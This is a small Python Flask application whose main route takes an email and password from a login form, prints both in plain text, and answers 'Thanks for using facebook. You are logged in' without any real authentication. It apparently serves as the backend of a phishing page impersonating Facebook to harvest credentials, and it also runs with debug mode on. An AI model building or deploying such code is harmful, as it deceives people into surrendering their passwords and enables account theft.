from flask import Flask, render_template, request

app = Flask(__name__,static_folder = "assests", static_url_path="/files")

@app.route("/", methods = ["GET", "POST"])
def hello_world():
    if request.method == "POST":
        name = request.form["email"]
        password = request.form["password"]
        print(f"The name is {name} and the password is {password}")
        return "<b>Thanks for using facebook. You are logged in</b>"
    # save it to the database
    return render_template("index.html")

@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/contact")
def contact():
    return "<p>Hello, I am in contact page!</p>"

app.run(debug=True)